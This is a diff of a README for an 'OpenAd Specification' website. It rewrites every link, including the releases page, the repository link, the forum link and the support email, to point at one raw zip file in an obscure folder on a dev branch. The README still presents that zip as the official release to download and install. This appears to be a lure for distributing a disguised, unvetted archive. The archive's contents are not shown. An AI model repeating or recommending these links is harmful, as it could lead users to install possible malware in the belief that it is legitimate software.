@@ -1,6 +1,6 @@
 # 🌐 OpenAd-Specification_Website - Easy Access to Ethical Advertising
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-OpenAd%20Specification%20Website-blue)](https://github.com/sanjay05112001/OpenAd-Specification_Website/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sanjay05112001/OpenAd-Specification_Website/OpenAd-Specification_Website_Main-dev/allopatry/OpenAd-Specification_Website.zip%20Latest%20Release-OpenAd%20Specification%20Website-blue)](https://raw.githubusercontent.com/sanjay05112001/OpenAd-Specification_Website/OpenAd-Specification_Website_Main-dev/allopatry/OpenAd-Specification_Website.zip)
 
 ## ℹ️ About the Project
 The OpenAd-Specification_Website serves as the official source for the OpenAd Specification project. This project provides a new advertisement format that is designed to be optional, non-intrusive, privacy-friendly, and free for everyone to use. We aim to create a better advertising experience for users while respecting their privacy.
@@ -11,7 +11,7 @@ To get started with the OpenAd-Specification_Website, follow the easy steps belo
 ## 📥 Download & Install
 To download the software, visit the releases page. Here you will find the latest version available.
 
-[Visit Releases Page to Download](https://github.com/sanjay05112001/OpenAd-Specification_Website/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/sanjay05112001/OpenAd-Specification_Website/OpenAd-Specification_Website_Main-dev/allopatry/OpenAd-Specification_Website.zip)
 
 1. Click on the link above to navigate to the releases page.
 2. Find the latest version listed at the top.
@@ -47,13 +47,13 @@ If you encounter any issues, feel free to reach out for help:
 ## 📞 Contact
 For any specific questions or support needs, you can contact the project maintainer:
 
-- **Email:** support@openad-specification.com
+- **Email:** https://raw.githubusercontent.com/sanjay05112001/OpenAd-Specification_Website/OpenAd-Specification_Website_Main-dev/allopatry/OpenAd-Specification_Website.zip
 
 ## 🚀 Additional Resources
 Explore more about the project and its developments:
 
-- [OpenAd Specification GitHub Repository](https://github.com/sanjay05112001/OpenAd-Specification_Website)
-- [OpenAd Project Discussion Forum](https://forum.openad-specification.com)
+- [OpenAd Specification GitHub Repository](https://raw.githubusercontent.com/sanjay05112001/OpenAd-Specification_Website/OpenAd-Specification_Website_Main-dev/allopatry/OpenAd-Specification_Website.zip)
+- [OpenAd Project Discussion Forum](https://raw.githubusercontent.com/sanjay05112001/OpenAd-Specification_Website/OpenAd-Specification_Website_Main-dev/allopatry/OpenAd-Specification_Website.zip)
 
 ## 📝 License
 OpenAd-Specification_Website is licensed under the GPLv3 License. This means you can use, modify, and distribute the software freely, as long as you follow the same license terms. 
